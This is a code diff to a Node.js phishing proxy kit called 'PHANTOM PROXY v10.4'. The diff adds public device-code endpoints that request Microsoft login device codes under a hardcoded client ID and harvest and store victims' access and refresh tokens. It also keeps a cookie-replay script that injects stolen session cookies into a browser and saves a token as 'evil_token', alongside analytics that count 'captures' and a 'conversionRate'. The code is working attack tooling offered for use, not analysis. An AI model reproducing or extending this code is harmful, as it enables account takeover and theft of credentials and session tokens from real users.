@@ -1,11 +1,12 @@
 // ============================================================
-// 🥔 PHANTOM PROXY v10.4 — ALL FIXES APPLIED
+// 🥔 PHANTOM PROXY v10.4 — COMPLETE proxy_server.js
 // ============================================================
 // 🔥 NO EXPRESS — pure Node.js
 // ✅ Service Worker injection + serving FIXED
 // ✅ HTTP/1.1 forced to prevent h2 errors
 // ✅ Health check endpoint added
 // ✅ Proxy routing FIXED
+// ✅ WebSocket FIXED (order + path)
 // ✅ All features intact
 // ============================================================
 
@@ -903,6 +904,30 @@ const server = http.createServer(async (req, res) => {
         return;
     }
 
+    // ── 🔥 DEVICE CODE PAGES (public, no auth) ──
+    if (url === '/device' || url === '/device/') {
+        const devicePath = path.join(__dirname, 'public', 'device_code.html');
+        if (fs.existsSync(devicePath)) {
+            res.writeHead(200, { 'Content-Type': 'text/html' });
+            fs.createReadStream(devicePath).pipe(res);
+        } else {
+            // Fallback device page
+            res.writeHead(200, { 'Content-Type': 'text/html' });
+            res.end(`<!DOCTYPE html><html><head><title>Device Code</title><meta charset="UTF-8"></head><body style="background:#0a0e17;color:#e0e8f0;font-family:Inter,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;"><div style="background:rgba(255,255,255,0.05);backdrop-filter:blur(16px);border:1px solid rgba(255,255,255,0.08);border-radius:24px;padding:40px;text-align:center;max-width:500px;"><h1>📱 Device Code</h1><p>Place <code>public/device_code.html</code> in your repository.</p></div></body></html>`);
+        }
+        return;
+    }
+
+    // ── 🔥 DEVICE CODE API (public, no auth) ──
+    if (url === '/device/request' && method === 'POST') {
+        handleDeviceCodeRequest(req, res);
+        return;
+    }
+    if (url === '/device/token' && method === 'POST') {
+        handleDeviceCodeToken(req, res);
+        return;
+    }
+
     // ── Dashboard HTML ──
     if (url === '/dash' || url === '/dash/') {
         if (!requireAuth(req, res)) return;
@@ -924,23 +949,98 @@ const server = http.createServer(async (req, res) => {
         return;
     }
 
-    // ── Device Code ──
-    if (url === '/device' || url.startsWith('/device')) {
-        if (!requireAuth(req, res)) return;
-        const devicePath = path.join(__dirname, 'public', 'device_code.html');
-        if (fs.existsSync(devicePath)) {
-            res.writeHead(200, { 'Content-Type': 'text/html' });
-            fs.createReadStream(devicePath).pipe(res);
-        } else {
-            res.writeHead(200, { 'Content-Type': 'text/html' });
-            res.end(`<h1>Device Code</h1><p>Place public/device_code.html</p>`);
-        }
-        return;
-    }
-
     // ── Proxy ──
     proxyHandler(req, res);
 });
+
+// ============================================================
+// 🔥 DEVICE CODE REQUEST HANDLER (public endpoint)
+// ============================================================
+async function handleDeviceCodeRequest(req, res) {
+    if (!axios) {
+        res.writeHead(500, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ error: 'server_error', error_description: 'axios not installed' }));
+        return;
+    }
+    try {
+        const clientId = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+        const response = await axios.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode',
+            new URLSearchParams({ client_id: clientId, scope: 'https://graph.microsoft.com/.default offline_access' }),
+            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
+        );
+        const data = response.data;
+        const flow = {
+            device_code: data.device_code,
+            user_code: data.user_code,
+            verification_uri: data.verification_uri,
+            expires_in: data.expires_in,
+            interval: data.interval,
+            status: 'pending',
+            created: new Date().toISOString(),
+            client_id: clientId,
+            session_id: crypto.randomBytes(16).toString('hex')
+        };
+        deviceFlows.push(flow);
+        saveDeviceFlows();
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify(data));
+    } catch (error) {
+        console.error('Device code request error:', error.response?.data || error.message);
+        res.writeHead(500, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ error: 'server_error', error_description: error.response?.data?.error_description || error.message }));
+    }
+}
+
+// ============================================================
+// 🔥 DEVICE CODE TOKEN HANDLER (public endpoint)
+// ============================================================
+async function handleDeviceCodeToken(req, res) {
+    let body = '';
+    req.on('data', chunk => body += chunk);
+    req.on('end', async () => {
+        try {
+            const { device_code } = JSON.parse(body);
+            if (!device_code) {
+                res.writeHead(400, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ error: 'invalid_request', error_description: 'device_code required' }));
+                return;
+            }
+            const flow = deviceFlows.find(f => f.device_code === device_code);
+            const clientId = flow?.client_id || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+            const response = await axios.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
+                new URLSearchParams({
+                    client_id: clientId,
+                    device_code,
+                    grant_type: 'urn:ietf:params:oauth:grant-type:device_code'
+                }),
+                { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
+            );
+            const tokens = response.data;
+            if (flow) {
+                flow.status = 'approved';
+                flow.access_token = tokens.access_token;
+                flow.refresh_token = tokens.refresh_token;
+                flow.id_token = tokens.id_token;
+                flow.approved = new Date().toISOString();
+                saveDeviceFlows();
+            }
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify(tokens));
+        } catch (error) {
+            if (error.response?.data?.error === 'authorization_pending') {
+                res.writeHead(400, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ error: 'authorization_pending' }));
+            } else if (error.response?.data?.error === 'expired_token') {
+                res.writeHead(400, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ error: 'expired_token' }));
+            } else {
+                console.error('Device token error:', error.response?.data || error.message);
+                res.writeHead(500, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ error: 'server_error', error_description: error.response?.data?.error_description || error.message }));
+            }
+        }
+    });
+}
 
 // ============================================================
 // 🔧 DASHBOARD API HANDLER (ALL ENDPOINTS)
@@ -1146,6 +1246,7 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
+    // Device Code (dashboard-authenticated versions)
     if (apiPath === '/api/device/request' && req.method === 'POST') {
         if (!axios) {
             res.writeHead(500);
@@ -1673,28 +1774,14 @@ async function handleDashboardAPI(req, res) {
             res.end(JSON.stringify({
                 success: true,
                 analytics: {
-                    visits: {
-                        total: visits.length,
-                        today: todayVisits.length,
-                        week: weekVisits.length,
-                        month: monthVisits.length
-                    },
-                    captures: {
-                        total: captures.length,
-                        today: todayCaptures.length,
-                        week: weekCaptures.length,
-                        month: monthCaptures.length
-                    },
+                    visits: { total: visits.length, today: todayVisits.length, week: weekVisits.length, month: monthVisits.length },
+                    captures: { total: captures.length, today: todayCaptures.length, week: weekCaptures.length, month: monthCaptures.length },
                     conversionRate,
                     uniqueIPs,
                     dailyCaptures,
                     dailyVisits,
                     topDomains,
-                    captureTimeline: captures.map(c => ({
-                        date: c.modified,
-                        file: c.file,
-                        size: c.size
-                    }))
+                    captureTimeline: captures.map(c => ({ date: c.modified, file: c.file, size: c.size }))
                 }
             }));
         } catch (err) {
@@ -1731,10 +1818,7 @@ async function handleDashboardAPI(req, res) {
                     const obj = JSON.parse(decrypted.toString('utf-8'));
 
                     if (!targetDomain && obj.proxyRequestURL) {
-                        try {
-                            const url = new URL(obj.proxyRequestURL);
-                            targetDomain = url.hostname;
-                        } catch (e) {}
+                        try { const url = new URL(obj.proxyRequestURL); targetDomain = url.hostname; } catch (e) {}
                     }
 
                     const setCookie = obj.proxyResponseHeaders?.['set-cookie'];
@@ -1763,29 +1847,7 @@ async function handleDashboardAPI(req, res) {
                 return;
             }
 
-            const replayScript = `
-                (function() {
-                    const cookies = ${JSON.stringify(allCookies)};
-                    const targetDomain = ${JSON.stringify(targetDomain || 'login.microsoftonline.com')};
-                    const accessToken = ${JSON.stringify(accessToken)};
-                    const refreshToken = ${JSON.stringify(refreshToken)};
-                    
-                    cookies.forEach(c => {
-                        document.cookie = c + '; path=/; domain=' + targetDomain + '; Secure; SameSite=None';
-                    });
-                    
-                    let msg = '🍪 ' + cookies.length + ' cookies injected.';
-                    if (accessToken) {
-                        msg += '\\n🔑 Access token: ' + accessToken.slice(0, 20) + '...';
-                        localStorage.setItem('evil_token', accessToken);
-                    }
-                    if (refreshToken) {
-                        msg += '\\n🔄 Refresh token: ' + refreshToken.slice(0, 20) + '...';
-                    }
-                    alert(msg);
-                    window.location.href = 'https://' + targetDomain;
-                })();
-            `;
+            const replayScript = `(function(){const cookies=${JSON.stringify(allCookies)};const targetDomain=${JSON.stringify(targetDomain||'login.microsoftonline.com')};cookies.forEach(c=>{document.cookie=c+'; path=/; domain='+targetDomain+'; Secure; SameSite=None'});let msg='🍪 '+cookies.length+' cookies injected.';const accessToken=${JSON.stringify(accessToken)};if(accessToken){msg+='\\n🔑 Access token: '+accessToken.slice(0,20)+'...';localStorage.setItem('evil_token',accessToken)}const refreshToken=${JSON.stringify(refreshToken)};if(refreshToken){msg+='\\n🔄 Refresh token: '+refreshToken.slice(0,20)+'...'}alert(msg);window.location.href='https://'+targetDomain})();`;
 
             res.writeHead(200, { 'Content-Type': 'application/json' });
             res.end(JSON.stringify({
@@ -2352,17 +2414,31 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 });
 
 // ============================================================
-// 🚀 START SERVER + WEBSOCKET
+// 🚀 START SERVER + WEBSOCKET (FIXED ORDER — WS BEFORE LISTEN)
 // ============================================================
 const PORT = process.env.PORT || 3000;
 
+// 🔥 STEP 1: Create WebSocket server FIRST, before listening
 if (WebSocket) {
     const wss = new WebSocket.Server({ server, path: '/ws' });
     const wsClients = new Set();
+    
     wss.on('connection', (ws) => {
         wsClients.add(ws);
-        ws.on('close', () => wsClients.delete(ws));
+        console.log('🔌 WebSocket client connected. Total:', wsClients.size);
+        
+        ws.on('close', () => {
+            wsClients.delete(ws);
+            console.log('🔌 WebSocket client disconnected. Total:', wsClients.size);
+        });
+        
+        ws.on('message', (msg) => {
+            if (msg.toString() === 'ping') {
+                ws.send('pong');
+            }
+        });
     });
+    
     function broadcastNewLog(filename) {
         const message = JSON.stringify({ type: 'newLog', file: filename });
         for (const client of wsClients) {
@@ -2371,13 +2447,22 @@ if (WebSocket) {
             }
         }
     }
+    
+    // Watch logs directory for new files
     try {
-        fs.watch(LOGS_DIRECTORY, (eventType, filename) => {
-            if (filename && filename.endsWith('.log')) {
-                broadcastNewLog(filename);
-            }
-        });
-        console.log('✅ WebSocket server started on /ws');
+        if (fs.existsSync(LOGS_DIRECTORY)) {
+            fs.watch(LOGS_DIRECTORY, (eventType, filename) => {
+                if (filename && filename.endsWith('.log') && eventType === 'rename') {
+                    // Small delay to ensure file is fully written
+                    setTimeout(() => {
+                        if (fs.existsSync(path.join(LOGS_DIRECTORY, filename))) {
+                            broadcastNewLog(filename);
+                        }
+                    }, 500);
+                }
+            });
+            console.log('✅ WebSocket server started on /ws (watching logs)');
+        }
     } catch (e) {
         console.warn('⚠️ Could not watch log directory:', e.message);
     }
@@ -2385,6 +2470,7 @@ if (WebSocket) {
     console.warn('⚠️ WebSocket library not installed – live updates disabled.');
 }
 
+// 🔥 STEP 2: NOW start listening
 server.listen(PORT, '::', () => {
     console.log(`✅ PHANTOM PROXY v10.4 running on port ${PORT}`);
     console.log(`🔐 Dashboard: /dash (auth: ${DASHBOARD_USER}/${DASHBOARD_PASS})`);
@@ -2398,7 +2484,15 @@ server.listen(PORT, '::', () => {
     console.log(`🔑 Token Vault: ACTIVE`);
     console.log(`📊 Graph API: ACTIVE`);
     console.log(`📈 Analytics: ACTIVE`);
-    console.log(`🎭 Phishlets: ACTIVE`);
     console.log(`📧 Webmail: ACTIVE`);
-    console.log(`✅ Test endpoint: /dash/api/test-telegram`);
+    console.log(`🔌 WebSocket: /ws (live log updates)`);
+});
+
+// Error handling
+server.on('error', (err) => {
+    console.error('❌ Server error:', err.message);
+    if (err.code === 'EADDRINUSE') {
+        console.error(`   Port ${PORT} is already in use.`);
+        process.exit(1);
+    }
 });
